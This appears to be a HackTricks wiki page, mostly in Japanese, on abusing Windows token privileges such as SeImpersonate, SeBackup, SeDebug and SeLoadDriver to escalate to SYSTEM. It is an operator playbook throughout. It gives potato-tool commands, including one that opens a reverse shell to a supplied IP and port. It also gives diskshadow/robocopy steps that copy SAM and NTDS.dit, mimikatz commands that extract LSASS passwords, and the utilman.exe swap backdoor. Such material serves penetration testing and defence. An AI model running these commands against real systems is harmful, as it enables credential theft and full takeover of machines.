# Tokens の悪用

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Windows Access Tokens とは何か **知らない** 場合は、続ける前にこのページを読んでください:


{{#ref}}
access-tokens.md
{{#endref}}

**すでに持っている tokens を悪用して権限昇格できる可能性があります**

### SeImpersonatePrivilege

これは、任意のプロセスが保持しうる権限で、ハンドルを取得できるなら、任意の token の impersonation（ただし作成ではない）を許可します。権限付き token は、Windows service (DCOM) に exploit への NTLM authentication を実行させることで取得でき、その後 SYSTEM 権限で process の実行を可能にします。この vulnerability は、[juicy-potato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（winrm を無効化する必要があります）、[SweetPotato](https://github.com/CCob/SweetPotato)、[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) など、さまざまな tools を使って悪用できます。

Modern operator notes:

- **JuicyPotato は legacy**: Windows 10 1809+/Server 2019+ では、到達可能な RPC/COM surface に応じて、**GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato**、または **PrintSpoofer** を優先してください。
- **LOCAL SERVICE** または **NETWORK SERVICE** として動作する service を compromise し、`whoami /priv` に **SeImpersonatePrivilege**/**SeAssignPrimaryTokenPrivilege** がない **filtered token** が表示される場合は、まずそのアカウントの **default privilege set** を復元し（たとえば **FullPowers** を使用）、その後 potato family を再試行してください。
- 一部の新しい forks は、元の tools より operator にとって使いやすいです。たとえば、**SigmaPotato** は reflection/in-memory execution と最新の Windows 互換性を追加しており、**PrintNotifyPotato** は PrintNotify COM service を悪用し、従来の Spooler path が無効な場合に有用なことがよくあります。
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

これは **SeImpersonatePrivilege** と非常に似ており、特権トークンを取得するために **同じ方法** を使用する。\
その後、この権限により、新規/サスペンド状態のプロセスに **primary token を割り当てる** ことができる。特権のある impersonation token があれば、primary token を派生できる（DuplicateTokenEx）。\
この token を使って、'CreateProcessAsUser' で **新しいプロセス** を作成するか、プロセスをサスペンド状態で作成して **token を設定** できる（一般に、実行中プロセスの primary token は変更できない）。

### SeTcbPrivilege

この token が有効になっている場合、**KERB_S4U_LOGON** を使って、資格情報を知らずに任意の他のユーザーの **impersonation token** を取得できる。さらに、token に **任意のグループ**（admins）を追加し、token の **integrity level** を "**medium**" に設定して、この token を **current thread** に割り当てる（SetThreadToken）。

### SeBackupPrivilege

この権限により、システムは任意のファイルに対して **すべての読み取りアクセス制御** を付与する（読み取り操作に限定）。これは、レジストリからローカル Administrator アカウントの **password hashes** を読み取るために利用され、その後、ハッシュを使って "**psexec**" や "**wmiexec**" などのツールを使用できる（Pass-the-Hash technique）。ただし、この technique は 2 つの条件で失敗する。Local Administrator アカウントが無効化されている場合、またはリモート接続してくる Local Administrators から管理者権限を削除する policy が適用されている場合である。\
実際には、最も信頼性の高い組み込みの手順は通常 **VSS + `robocopy /b`** である。shadow copy を作成/公開し、その後 `SAM`/`SYSTEM` または `NTDS.dit` を **backup mode** でコピーする。これにより file ACLs を回避できる。
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

この権限により、ファイルの Access Control List (ACL) に関係なく、任意のシステムファイルへの**書き込みアクセス**が可能になります。これにより、**servicesの変更**、DLL Hijacking、Image File Execution Options を使った **debuggers** の設定など、さまざまな EoP 手法が可能になります。

### SeCreateTokenPrivilege

SeCreateTokenPrivilege は強力な権限で、特にユーザーが token を impersonate できる場合に有用ですが、SeImpersonatePrivilege がなくても有効です。この機能は、同じユーザーを表し、かつ現在の process の integrity level を超えない token を impersonate できることに依存します。

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** 特定の条件下では、SeCreateTokenPrivilege を利用して EoP のために token を impersonate できます。
- **Conditions for Token Impersonation:** 侵害対象の token は同じユーザーに属し、かつ impersonation を試みる process の integrity level 以下である必要があります。
- **Creation and Modification of Impersonation Tokens:** ユーザーは impersonation token を作成し、privileged group の SID (Security Identifier) を追加して強化できます。

### SeLoadDriverPrivilege

この権限により、`ImagePath` と `Type` に特定の値を設定した registry entry を作成することで、**device drivers の load と unload** が可能になります。`HKLM` (HKEY_LOCAL_MACHINE) への直接の書き込みアクセスは制限されているため、代わりに `HKCU` (HKEY_CURRENT_USER) を利用する必要があります。ただし、kernel が driver configuration として `HKCU` を認識できるようにするには、特定の path に従う必要があります。

Modern offensive use is usually **BYOVD** (bring your own vulnerable driver): load a **signed but vulnerable** kernel driver and then use its IOCTLs to disable protections or jump to kernel code execution. Keep in mind that on recent Windows 11/Server builds the **Microsoft vulnerable driver blocklist** and/or **HVCI/Memory Integrity** often break older public chains, so the classic `szkg64.sys`-style examples are no longer universally reliable.

この path は `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` です。`<RID>` は現在のユーザーの Relative Identifier です。`HKCU` 内では、この path 全体を作成し、2つの値を設定する必要があります。

- `ImagePath`、実行する binary への path
- `Type`、値は `SERVICE_KERNEL_DRIVER` (`0x00000001`)。

**Steps to Follow:**

1. 制限された書き込みアクセスのため、`HKLM` ではなく `HKCU` にアクセスする。
2. `HKCU` 内に `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` を作成する。ここで `<RID>` は現在のユーザーの Relative Identifier を表す。
3. `ImagePath` を binary の実行 path に設定する。
4. `Type` を `SERVICE_KERNEL_DRIVER` (`0x00000001`) に設定する。
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
この権限を悪用する他の方法は [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege) にあります

### SeTakeOwnershipPrivilege

これは **SeRestorePrivilege** に似ています。その主な機能は、プロセスが **オブジェクトの所有権を取得する** ことを許可し、WRITE_OWNER アクセス権を付与することで明示的な任意アクセス制御の要件を回避します。手順は、まず書き込み目的で対象の registry key の所有権を確保し、その後 DACL を変更して書き込み操作を有効にします。
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

この権限は、**他のプロセスをデバッグ**することを許可し、メモリの読み書きも含まれます。この権限を使うことで、ほとんどの antivirus や host intrusion prevention solution を回避できる、さまざまなメモリインジェクション手法を利用できます。

現代の Windows では、`SeDebugPrivilege` があれば通常、**保護されていない SYSTEM プロセス**を開いてトークンを複製するには十分ですが、**LSASS** に触れることまで保証するものでは**ありません**。**RunAsPPL / LSA Protection** が有効な場合、`SeDebugPrivilege` があっても、保護されていないプロセスは LSASS を読み取ったり注入したりできません。その場合は、別の非 PPL の SYSTEM プロセスからトークンを盗むか、`procdump` が動くと決めつけるのではなく PPL bypass/BYOVD と組み合わせてください。`SeDebugPrivilege` + `SeImpersonatePrivilege` を使った完全なトークンコピーの例は、[this page](sedebug-+-seimpersonate-copy-token.md) を参照してください。

#### Dump memory

[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) を [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) から使って、**プロセスのメモリをキャプチャ**できます。特にこれは、ユーザーがシステムに正常にログインした後にユーザー認証情報を保存する役割を持つ **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** プロセスに適用できます。

その後、この dump を mimikatz に読み込んでパスワードを取得できます:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shell を取得したい場合は、以下を使えます:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

この権限（Perform volume maintenance tasks）は、raw volume device handle（例: \\.\C:）を開いて、NTFS ACLs をバイパスする direct disk I/O を可能にします。これにより、基盤となる blocks を読み取ることで volume 上の任意の file の bytes を copy でき、機密情報の arbitrary file read が可能になります（例: %ProgramData%\Microsoft\Crypto\ にある machine private keys、registry hives、VSS 経由の SAM/NTDS）。特に CA servers では影響が大きく、CA private key を exfiltrating すると Golden Certificate を forging して任意の principal を impersonate できます。

詳細な techniques と mitigations は以下を参照してください:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
**Disabled** として表示される tokens は通常 enable できるので、_Enabled_ と _Disabled_ の両方の privileges を悪用できることがよくあります。

### Enable All the tokens

disabled privileges がある場合、script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) を使ってすべての tokens を enable できます:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Windows tokens を定義する完全な token privileges cheatsheet は [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) にあり、以下の要約では、その privilege を使って admin session を取得するか、機密ファイルを読む直接的な方法のみを列挙する。

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | 更新してくれた [Aurélien Chalot](https://twitter.com/Defte_) に感謝します。近いうちに、もっと recipe-like な表現に言い換えてみます。                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` または専用の SeBackup-aware copy helpers を使って機密ファイルを読む。                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`、場合によっては `%WINDIR%\MEMORY.DMP` に有効。<br><br>- `robocopy` は便利だが、専用の SeBackup cmdlets/APIs の方が、lock された/open なファイルに対して柔軟なことが多い。</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` を使って、local admin rights を含む任意の token を作成する。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** の SYSTEM token を複製するか、protected されていない process から memory を dump する。                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection が有効な場合、LSASS dumping は通常ブロックされる。</p><p>Script は [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) にある。</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation を使って SYSTEM を spawn する (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.)。                                                                                                                                                                                    | <p>IIS APPPOOL、MSSQL、scheduled tasks、または既に `SeImpersonatePrivilege` を持っている任意の context から最も実用的。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. 署名済みだが脆弱な kernel driver (BYOVD) を load する<br>2. driver の IOCTL を使って kernel R/W を得る、security tooling を無効化する、または SYSTEM に elevate する<br><br>あるいは、この privilege は <code>fltMC</code> builtin command を使って security 関連の driver を unload するためにも使える。例: <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> のような古い public drivers は、vulnerable-driver blocklist / HVCI により modern Windows では increasingly blocked される。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege を持つ状態で PowerShell/ISE を起動する。<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> を使って privilege を有効化する。<br>3. utilman.exe を utilman.old に rename する<br>4. cmd.exe を utilman.exe に rename する<br>5. console を lock して Win+U を押す</p> | <p>一部の AV software で attack が検出される可能性がある。</p><p>代替方法として、同じ privilege を使って "Program Files" に保存された service binaries を置き換える方法がある。</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe を utilman.exe に rename する<br>4. console を lock して Win+U を押す</p>                                                                                                                                       | <p>一部の AV software で attack が検出される可能性がある。</p><p>代替方法として、同じ privilege を使って "Program Files" に保存された service binaries を置き換える方法がある。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>token を操作して local admin rights を含める。SeImpersonate が必要な場合がある。</p><p>要検証。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Windows tokens を定義するこの table を確認する: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- token を使った privesc についての [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) を確認する。
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
